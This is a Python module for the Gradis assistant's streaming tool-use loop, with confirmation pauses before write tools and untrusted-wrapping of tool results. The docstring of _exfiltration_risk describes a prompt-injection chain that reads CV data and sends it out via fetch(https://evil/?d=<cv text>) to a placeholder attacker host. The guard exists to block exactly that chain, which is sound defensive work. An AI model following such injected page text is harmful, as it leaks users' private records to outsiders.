"""Gradis chat loop: one bounded tool-use turn over the assistant tools,
pausing on a confirmation card before any write tool."""

import json
import logging
from collections.abc import AsyncIterator

import anyio

from api.agent.llm.base import roomier
from api.agent.llm.factory import get_provider
from api.agent.tool_preview import preview as tool_preview
from api.agent.untrusted import wrap_tool_result
from api.agents import registry as agents_registry
from api.assistant import attachments as gradis_attachments
from api.assistant import conversations as gradis_conversations
from api.assistant import modes as gradis_modes
from api.assistant import queue
from api.assistant import sources as gradis_sources
from api.assistant import tools as assistant_tools
from api.assistant.prompts import GRADIS_SYSTEM_PROMPT
from api.assistant.schemas import UiContext
from api.core.config import settings
from api.metering.service import metered

logger = logging.getLogger(__name__)

MAX_CHAT_TURNS = 20
OUT_OF_STEPS = (
    f"I ran out of steps ({MAX_CHAT_TURNS}) before finishing. "
    "Say \"continue\" and I'll pick up where I stopped, or ask for a smaller piece."
)
RESULT_PREVIEW_CHARS = 800
#: Conversations with a turn in flight: one writer per history, since one
#: process serves the API. Dropped in a finally, so a dead turn frees the chat.
_RUNNING_TURNS: set[str] = set()


async def _settle(session) -> None:
    """Commit any open transaction before waiting on something slow (the
    client or the model), so no connection idles in transaction and a hang-up
    can't cancel a rollback mid-way. Only reads are open at these points."""
    if session.in_transaction():
        await session.commit()


async def _release(reservation) -> None:
    """Release a spend reservation even when the client has hung up:
    the request's cancel scope cancels every await in it, cleanup
    included, which would hold the tokens until the day ends."""
    from api.billing import service as billing

    with anyio.CancelScope(shield=True):
        await billing.release(reservation)


def turn_running(conversation_id: str) -> bool:
    """True when a turn is in flight on this conversation. A live turn
    counts from the moment it starts, before its loop marks the chat."""
    from api.assistant import live as gradis_live

    return conversation_id in _RUNNING_TURNS or gradis_live.running(conversation_id)


def _preview(value: object) -> str:
    return tool_preview(value, RESULT_PREVIEW_CHARS)


#: How much of a turn's reasoning the log keeps for the chat to show.
MAX_THOUGHT_CHARS = 40_000


def _turn_notes(events: list[dict]) -> list[str]:
    """The model's text for each turn, in the order it said it."""
    return [
        e["note"]
        for e in events
        if e.get("kind") == "turn" and (e.get("note") or "").strip()
    ]


def _reply_text(events: list[dict]) -> str:
    """The answer: what the model wrote after its last tool call. The
    notes between calls stay in the trace (the chat's splitAnswer)."""
    last_tool = max((i for i, e in enumerate(events) if e.get("kind") != "turn"), default=-1)
    return "\n\n".join(_turn_notes(events[last_tool + 1 :]))


def _tool_events(events: list[dict]) -> list[dict]:
    """Just the tool calls, for the flat list the saved-record cards read."""
    return [e for e in events if e.get("tool")]


def _iso(at) -> str | None:
    """A stored timestamp for a stream event. ISO, not json's str(), which
    puts a space where some browsers' Date parsing needs a T."""
    return at.isoformat() if at else None


def _message_out(msg, content: str, events: list[dict], sources: list[dict]) -> dict:
    """One assistant message: its text, its tool calls, the ordered log
    the chat renders interleaved, and the sources the text cites."""
    return {
        "id": msg.id,
        "role": "assistant",
        "content": content,
        "created_at": _iso(msg.created_at),
        "model": msg.model,
        "tools": _tool_events(events),
        "segments": events,
        "sources": sources,
    }


def _user_message_out(msg, queue_id: str | None = None, mode: str | None = None) -> dict:
    """A prompt the student sent mid-turn, as a transcript message."""
    return {
        "id": msg.id,
        "role": "user",
        "content": msg.content,
        "created_at": _iso(msg.created_at),
        "queue_id": queue_id,
        "mode": mode,
    }


def _mode_marker(
    mode: str,
    attachments: list[dict] | None = None,
    chips: list[dict] | None = None,
) -> list[dict]:
    """A user message's log: the mode its turn ran in, what was attached
    (names and thumbnails only), and the composer's context chips."""
    marker = [{"kind": "mode", "mode": mode}]
    if attachments:
        marker.append({"kind": "attachments", "items": gradis_attachments.summary(attachments)})
    if chips:
        marker.append({"kind": "context", "items": chips})
    return marker


def _tool_content(tool_name: str, result: object, sources: list[dict]) -> str:
    """A tool result as the model reads it, ending with the keys it may
    cite. The keys sit inside the untrusted block: titles come from the
    page or record, not from us."""
    text = json.dumps(result, default=str) + gradis_sources.sources_note(sources)
    return wrap_tool_result(tool_name, text)


#: The reply when even the roomier budget ran out before the model said
#: anything: a thinking model reasoned until its limit.
CUT_OFF = (
    "I ran out of room while thinking and didn't get to an answer. Try again, "
    "ask for a smaller change, or pick a model or effort level that thinks less."
)


def _final_reply(
    events: list[dict], registry: gradis_sources.SourceRegistry, fallback: str
) -> tuple[str, list[dict]]:
    """The reply with only the citations the server issued, and the
    sources it cites. The turn notes are cleaned in place, so the log the
    chat renders matches the reply."""
    for event in events:
        if event.get("kind") == "turn" and event.get("note"):
            note, dropped = gradis_sources.strip_unknown(event["note"], registry.by_key)
            if dropped:
                logger.info("Gradis cited unknown sources %s; dropped", dropped)
            event["note"] = note
    reply = _reply_text(events) or fallback
    return reply, registry.cited("\n\n".join([*_turn_notes(events), reply]))


def _context_block(context: UiContext | None) -> str:
    if context is None:
        return ""
    bits = []
    if context.page:
        bits.append(f"page the user is on: {context.page}")
    if context.run_id:
        bits.append(f"current run_id: {context.run_id}")
    if context.candidate_id:
        bits.append(f"selected candidate_id: {context.candidate_id}")
    if context.application_id:
        bits.append(f"selected application_id: {context.application_id}")
    if context.draft_id:
        bits.append(f"selected draft_id: {context.draft_id}")
    if context.document_id:
        bits.append(f"open document_id: {context.document_id}")
    if context.cv_version_id:
        bits.append(f"open tailored version_id: {context.cv_version_id}")
    if context.selection:
        bits.append(f"user-selected text: {context.selection}")
    if not bits:
        return ""
    return "\n\n[UI context]\n" + "\n".join(f"- {b}" for b in bits)


#: Gradis tools that return the student's private material (CV text,
#: tracked applications, drafts).
SENSITIVE_READ_TOOLS = frozenset(
    {
        "cv_read",
        "read_document",
        "cv_get_application_context",
        "cv_list_suggestions",
        "list_applications",
        "get_application",
        "list_drafts",
        "list_candidate_drafts",
        # Hits include drafts and applications.
        "search",
        # Can show an application or a draft.
        "show_record",
    }
)


def _exfiltration_risk(tool_name: str, arguments: dict, history: list[dict]) -> bool:
    """True when this call could carry private data out: a fetch_page to a
    URL that neither the user typed nor a search returned, after this turn
    has already read CV, application or draft data. Injected page text
    could otherwise chain read -> fetch(https://evil/?d=<cv text>)."""
    if tool_name != "fetch_page":
        return False
    url = str((arguments or {}).get("url") or "")
    turn_start = 0
    for i, m in enumerate(history):
        if m.get("role") == "user" and isinstance(m.get("content"), str):
            turn_start = i
    turn = history[turn_start:]
    if not any(m.get("name") in SENSITIVE_READ_TOOLS for m in turn):
        return False
    for m in history:
        content = m.get("content")
        if not isinstance(content, str) or not url:
            continue
        typed = m.get("role") == "user"
        searched = m.get("role") == "tool" and m.get("name") == "search_web"
        if (typed or searched) and url in content:
            return False
    return True


async def _run_streaming_loop(
    session,
    user_id: str | None,
    conv,
    system: str,
    history: list[dict],
    events: list[dict],
    usage: dict,
    start_turn: int = 0,
    model: str | None = None,
    effort: str | None = None,
    mode: str = gradis_modes.DEFAULT_MODE,
    registry: gradis_sources.SourceRegistry | None = None,
) -> AsyncIterator[dict]:
    """Shared provider loop behind both streaming entries.

    `events` is the turn's ordered log of model text and tool calls. A write
    tool pauses the turn: the pending call and the log so far are persisted and
    confirm_required ends the stream. The queue is drained here: urgent prompts
    fold in before the next model call, waiting ones are answered next in this
    stream. `mode` narrows the allowed tools; `registry` keys citable sources.
    """
    from api.billing import service as billing
    from api.providers import service as providers_service

    llm_kwargs = await providers_service.resolve_llm_kwargs(session, user_id, model)
    from api.assistant.capabilities import effort_levels
    raw_provider = get_provider(**llm_kwargs)
    provider_id = getattr(raw_provider, "name", settings.llm_provider)
    model_id = getattr(raw_provider, "model", settings.llm_model)
    if effort and effort in effort_levels(provider_id, model_id):
        raw_provider.effort = effort
    provider = metered(raw_provider, user_id, "chat")
    turns = start_turn
    bundle = gradis_modes.get_mode(mode)
    # The student's disables win; the mode only narrows what is left.
    definitions = bundle.narrow(
        await agents_registry.assistant_definitions(session, user_id)
    )
    if registry is None:
        registry = await gradis_conversations.source_registry(session, conv)
        registry.absorb(events)
    offered: list[dict] = []
    for turn in range(start_turn, MAX_CHAT_TURNS):
        turns = turn + 1
        # Reads first; the write tools join once the chat asks for a
        # change, and stay.
        offered = assistant_tools.phase_definitions(
            assistant_tools.without_unused_legacy(definitions, history),
            assistant_tools.writes_unlocked(history),
        )
        # Prompts the student marked urgent while this turn was running:
        # the agent sees them before it decides what to do next.
        for urgent in await queue.take_urgent(session, conv):
            history.append({"role": "user", "content": urgent["content"]})
            umsg = await gradis_conversations.append_message(
                session, conv, "user", urgent["content"], _mode_marker(mode)
            )
            gradis_conversations.save_history(conv, history)
            await session.commit()
            yield {
                "event": "user_message",
                "message": _user_message_out(umsg, urgent["id"], mode),
            }
        yield {"event": "context_usage", "input_tokens": billing.estimate_tokens(history, system + json.dumps(offered), 0),
               "estimated": True, "provider": provider_id, "model": model_id}
        yield {"event": "status", "message": "Thinking…"}
        response = None
        budget = settings.llm_max_tokens
        while True:
            # No transaction across the model call (see _settle).
            await _settle(session)
            # Same spend gate as the worker, before every model call.
            reservation = await billing.reserve_model_call(
                user_id,
                llm_kwargs,
                billing.estimate_tokens(history, system, budget),
            )
            try:
                async for event in provider.chat_stream(
                    messages=history,
                    system=system,
                    tools=offered,
                    max_tokens=budget,
                ):
                    if event.get("type") == "token":
                        yield {"event": "token", "text": event["text"]}
                    elif event.get("type") == "reasoning":
                        yield {"event": "reasoning", "text": event["text"]}
                    elif event.get("type") == "done":
                        response = event["response"]
            finally:
                await _release(reservation)
            if response is None:  # pragma: no cover - providers always end with done
                raise RuntimeError("Provider stream ended without a response")
            # A thinking model that spent the whole budget reasoning said
            # nothing yet: once more, with room to finish.
            if not response.empty_at_limit or budget >= roomier(settings.llm_max_tokens):
                break
            logger.info("Gradis reply cut off at %s tokens before any text; asking again", budget)
            usage["input_tokens"] += (response.usage or {}).get("input_tokens", 0)
            usage["output_tokens"] += (response.usage or {}).get("output_tokens", 0)
            budget = roomier(settings.llm_max_tokens)
            response = None
            # The next attempt reasons from the start: the chat drops the
            # thoughts that led nowhere.
            yield {"event": "reasoning", "text": "", "reset": True}
            yield {"event": "status", "message": "Still thinking…"}
        if (response.usage or {}).get("input_tokens"):
            yield {"event": "context_usage", "input_tokens": response.usage["input_tokens"],
                   "estimated": False, "provider": provider_id, "model": model_id}
        usage["input_tokens"] += (response.usage or {}).get("input_tokens", 0)
        usage["output_tokens"] += (response.usage or {}).get("output_tokens", 0)

        # What the model said this turn, before its tools ran: the chat
        # shows it in place, between the tool calls it belongs to.
        note = (response.text or "").strip()
        thought = (response.reasoning or "").strip()[:MAX_THOUGHT_CHARS]
        if note or thought:
            events.append({"kind": "turn", "turn": turn + 1, "note": note,
                           **({"thought": thought} if thought else {})})

        if not response.tool_calls:
            reply, cited = _final_reply(
                events,
                registry,
                CUT_OFF if response.empty_at_limit else "I don't have an answer for that.",
            )
            history.append({"role": "assistant", "content": reply})
            msg = await gradis_conversations.append_message(
                session, conv, "assistant", reply, events, model=model_id
            )
            gradis_conversations.save_history(conv, history)
            await session.commit()
            yield {"event": "message", "message": _message_out(msg, reply, events, cited)}
            # A prompt the student sent while this ran is answered next,
            # in this same stream.
            nxt = await queue.take_next(session, conv)
            if nxt is None:
                yield _done(turns, usage, offered)
                return
            events = []
            history.append({"role": "user", "content": nxt["content"]})
            umsg = await gradis_conversations.append_message(
                session, conv, "user", nxt["content"], _mode_marker(mode)
            )
            gradis_conversations.save_history(conv, history)
            await session.commit()
            yield {
                "event": "user_message",
                "message": _user_message_out(umsg, nxt["id"], mode),
            }
            continue

        history.append(
            {
                "role": "assistant",
                "content": response.text,
                "tool_calls": [
                    {
                        "id": tc.id,
                        "name": tc.name,
                        "arguments": tc.arguments,
                        "extra_content": tc.extra_content,
                    }
                    for tc in response.tool_calls
                ],
            }
        )
        for tool_use in response.tool_calls:
            if not bundle.allows(tool_use.name):
                # Defense in depth: the mode never offered this tool, but a
                # call can still arrive (history from an earlier mode).
                result = {
                    "error": (
                        f"{tool_use.name} isn't available in {bundle.label} mode. "
                        "Answer without it, or say which mode can do it."
                    )
                }
                events.append(
                    {
                        "turn": turn + 1,
                        "tool": tool_use.name,
                        "input": tool_use.arguments,
                        "result_preview": _preview(result),
                        "ok": False,
                    }
                )
                yield {
                    "event": "tool_result",
                    "turn": turn + 1,
                    "tool": tool_use.name,
                    "ok": False,
                    "preview": _preview(result),
                }
                history.append(
                    {
                        "role": "tool",
                        "tool_call_id": tool_use.id,
                        "name": tool_use.name,
                        "content": json.dumps(result),
                    }
                )
                continue
            if tool_use.name == assistant_tools.ENABLE_CHANGES:
                # Handled here, not a registry tool: the call itself, now in
                # the history, unlocks the write tools from the next turn.
                result = {
                    "enabled": True,
                    "note": (
                        "The write tools are available for the rest of this chat. "
                        "Each one still asks the user before it runs."
                    ),
                }
                events.append(
                    {
                        "turn": turn + 1,
                        "tool": tool_use.name,
                        "input": tool_use.arguments,
                        "result_preview": _preview(result),
                        "ok": True,
                    }
                )
                history.append(
                    {
                        "role": "tool",
                        "tool_call_id": tool_use.id,
                        "name": tool_use.name,
                        "content": json.dumps(result),
                    }
                )
                continue
            if await agents_registry.assistant_confirm_required(
                session, user_id, tool_use.name
            ) or _exfiltration_risk(tool_use.name, tool_use.arguments, history):
                call = {
                    "id": tool_use.id,
                    "tool": tool_use.name,
                    "arguments": tool_use.arguments,
                    "summary": assistant_tools.describe_call(
                        tool_use.name, tool_use.arguments
                    ),
                    # The turn it came from, and the log so far: the client
                    # shows what the model already said while it waits.
                    "turn": turn + 1,
                    "segments": list(events),
                    "usage": dict(usage),
                    "status": "waiting",
                }
                gradis_conversations.set_pending(conv, call, history)
                await session.commit()
                yield {"event": "confirm_required", "call": call}
                return
            yield {
                "event": "tool_start",
                "turn": turn + 1,
                "tool": tool_use.name,
                "input": tool_use.arguments,
            }
            result = await assistant_tools.invoke(
                tool_use.name, tool_use.arguments, session, user_id
            )
            ok = not (isinstance(result, dict) and "error" in result)
            found = registry.register(
                gradis_sources.extract_sources(tool_use.name, result, tool_use.arguments)
            )
            event = {
                "turn": turn + 1,
                "tool": tool_use.name,
                "input": tool_use.arguments,
                "result_preview": _preview(result),
                "ok": ok,
            }
            if found:
                event["sources"] = found
            events.append(event)
            yield {
                "event": "tool_result",
                "turn": turn + 1,
                "tool": tool_use.name,
                "ok": ok,
                "preview": _preview(result),
            }
            if found:
                yield {"event": "sources", "sources": found}
            history.append(
                {
                    "role": "tool",
                    "tool_call_id": tool_use.id,
                    "name": tool_use.name,
                    "content": _tool_content(tool_use.name, result, found),
                }
            )

    # Out of steps mid-task: say so, rather than end on a half-finished note.
    events.append({"kind": "turn", "turn": MAX_CHAT_TURNS, "note": OUT_OF_STEPS})
    reply, cited = _final_reply(events, registry, OUT_OF_STEPS)
    history.append({"role": "assistant", "content": reply})
    msg = await gradis_conversations.append_message(
        session, conv, "assistant", reply, events, model=model_id
    )
    gradis_conversations.save_history(conv, history)
    await session.commit()
    yield {"event": "message", "message": _message_out(msg, reply, events, cited)}
    yield _done(turns, usage, offered)


def _done(turns: int, usage: dict, offered: list[dict]) -> dict:
    """The stream's last event. It says which tool schemas the last model
    call was offered, so a trace shows the phase."""
    return {
        "event": "done",
        "turns": turns,
        "usage": dict(usage),
        "tools_offered": [d["name"] for d in offered],
    }


def _is_unanswered(history: list[dict], user_content: str) -> bool:
    """True when the transcript ends on exactly this user message, i.e. the
    previous attempt at the turn produced no assistant reply."""
    if not history:
        return False
    last = history[-1]
    return last.get("role") == "user" and last.get("content") == user_content


async def begin_streaming_turn(
    user_id: str,
    conversation_id: str,
    user_content: str,
    context: UiContext | None = None,
    model: str | None = None,
    effort: str | None = None,
    retry: bool = False,
    replace_message_id: str | None = None,
    continue_turn: bool = False,
    mode: str = gradis_modes.DEFAULT_MODE,
) -> AsyncIterator[dict]:
    """Start a user turn: persist the user message, then stream the loop.

    `retry` reuses the trailing unanswered user message; `replace_message_id`
    first drops that message and every later turn from transcript and history;
    `continue_turn` carries on a turn that died after its call was approved.

    Owns its DB session: the request-scoped one may close before the SSE body
    is consumed, detaching ORM rows and dropping updates.
    """
    from api.core.db import SessionLocal

    async with SessionLocal() as session:
        conv = await gradis_conversations.get_conversation_or_404(
            session, conversation_id, user_id
        )
        if gradis_conversations.load_waiting(conv) is not None:
            await _settle(session)
            yield {
                "event": "error",
                "message": "A confirmation is outstanding — approve or deny it first",
            }
            return
        system = (
            GRADIS_SYSTEM_PROMPT + gradis_modes.get_mode(mode).prompt + _context_block(context)
        )
        history = gradis_conversations.load_history(conv)
        events: list[dict] = []
        start_turn = 0
        if continue_turn:
            # The turn died after its call ran: carry on from where it
            # stopped, with the log it had produced.
            pending = gradis_conversations.load_pending(conv)
            events = list((pending or {}).get("segments") or [])
            if not events:
                await _settle(session)
                yield {
                    "event": "error",
                    "message": "There is no unfinished turn to continue",
                }
                return
            start_turn = max((e.get("turn") or 0) for e in events)
        else:
            # A fresh turn supersedes the log of a turn that died.
            stale = gradis_conversations.load_pending(conv)
            if stale and stale.get("status") == "approved":
                gradis_conversations.clear_pending(conv)
                await session.commit()
            attached = [a.model_dump(exclude_none=True) for a in context.attachments] if context else []
            chips = [c.model_dump(exclude_none=True) for c in context.chips] if context else []
            # The thumbnail is for the bubble; the model gets the full image.
            sent = [{k: v for k, v in a.items() if k != "thumb_url"} for a in attached]
            if replace_message_id is not None:
                users_before = await gradis_conversations.remove_from_message(
                    session, conv, replace_message_id
                )
                history = gradis_conversations.history_before_user(history, users_before)
                history.append({"role": "user", "content": user_content, **({"attachments": sent} if sent else {})})
                gradis_attachments.prune_images(history)
                await gradis_conversations.append_message(
                    session, conv, "user", user_content, _mode_marker(mode, attached, chips)
                )
                gradis_conversations.save_history(conv, history)
                await session.commit()
            elif not (retry and _is_unanswered(history, user_content)):
                history.append({"role": "user", "content": user_content, **({"attachments": sent} if sent else {})})
                gradis_attachments.prune_images(history)
                await gradis_conversations.append_message(
                    session, conv, "user", user_content, _mode_marker(mode, attached, chips)
                )
                gradis_conversations.save_history(conv, history)
                await session.commit()
        usage = {"input_tokens": 0, "output_tokens": 0}
        _RUNNING_TURNS.add(conversation_id)
        try:
            async for event in _run_streaming_loop(
                session,
                user_id,
                conv,
                system,
                history,
                events,
                usage,
                start_turn=start_turn,
                model=model,
                effort=effort,
                mode=mode,
            ):
                await _settle(session)
                yield event
        finally:
            # The turn is over, however it ended: the conversation is free
            # for the next one.
            _RUNNING_TURNS.discard(conversation_id)


async def resume_streaming_turn(
    user_id: str,
    conversation_id: str,
    call_id: str,
    approved: bool,
    context: UiContext | None = None,
    model: str | None = None,
    effort: str | None = None,
    mode: str = gradis_modes.DEFAULT_MODE,
) -> AsyncIterator[dict]:
    """Resolve an outstanding confirmation, then stream onward. The approved
    call runs whatever the mode; `mode` governs the rest. Owns its DB session."""
    from api.core.db import SessionLocal

    async with SessionLocal() as session:
        conv = await gradis_conversations.get_conversation_or_404(
            session, conversation_id, user_id
        )
        pending = gradis_conversations.load_waiting(conv)
        if pending is None or pending.get("id") != call_id:
            await _settle(session)
            yield {
                "event": "error",
                "message": "No matching confirmation is outstanding",
            }
            return
        system = (
            GRADIS_SYSTEM_PROMPT + gradis_modes.get_mode(mode).prompt + _context_block(context)
        )
        history = gradis_conversations.load_history(conv)
        # The log so far, joined by the approved call, so the reply is the whole turn.
        events: list[dict] = list(pending.get("segments") or [])
        turn = int(pending.get("turn") or 1)
        usage = {
            "input_tokens": int((pending.get("usage") or {}).get("input_tokens", 0)),
            "output_tokens": int((pending.get("usage") or {}).get("output_tokens", 0)),
        }
        registry = await gradis_conversations.source_registry(session, conv)
        registry.absorb(events)
        found: list[dict] = []
        if approved:
            await _settle(session)
            yield {
                "event": "tool_start",
                "turn": turn,
                "tool": pending["tool"],
                "input": pending["arguments"],
            }
            result = await assistant_tools.invoke(
                pending["tool"], pending["arguments"], session, user_id, approved=True
            )
            ok = not (isinstance(result, dict) and "error" in result)
            preview = _preview(result)
            found = registry.register(
                gradis_sources.extract_sources(pending["tool"], result, pending["arguments"])
            )
        else:
            result = {
                "error": (
                    "User declined this action — do not retry it or ask again. "
                    "Acknowledge briefly and offer an alternative."
                )
            }
            ok = False
            preview = _preview(result)
        event = {
            "turn": turn,
            "tool": pending["tool"],
            "input": pending["arguments"],
            "result_preview": preview,
            "ok": ok,
        }
        if found:
            event["sources"] = found
        events.append(event)
        history.append(
            {
                "role": "tool",
                "tool_call_id": pending["id"],
                "name": pending["tool"],
                "content": _tool_content(pending["tool"], result, found),
            }
        )
        # Keep the answered call and log until the turn ends, so a failure continues
        # the turn. Committed with the write, before the result goes out, so a
        # hang-up can't leave the write applied and the call awaiting approval.
        gradis_conversations.answer_pending(conv, pending, history, events)
        await session.commit()
        yield {
            "event": "tool_result",
            "turn": turn,
            "tool": pending["tool"],
            "ok": ok,
            "preview": preview,
        }
        if found:
            yield {"event": "sources", "sources": found}
        _RUNNING_TURNS.add(conversation_id)
        try:
            async for event in _run_streaming_loop(
                session,
                user_id,
                conv,
                system,
                history,
                events,
                usage,
                start_turn=turn,
                model=model,
                effort=effort,
                mode=mode,
                registry=registry,
            ):
                await _settle(session)
                yield event
        finally:
            # The turn is over, however it ended: the conversation is free
            # for the next one.
            _RUNNING_TURNS.discard(conversation_id)
        # The turn is over: its log can go. A call waiting for an answer
        # (the model asked again) stays.
        still_pending = gradis_conversations.load_pending(conv)
        if still_pending and still_pending.get("status") == "approved":
            gradis_conversations.clear_pending(conv)
            await session.commit()
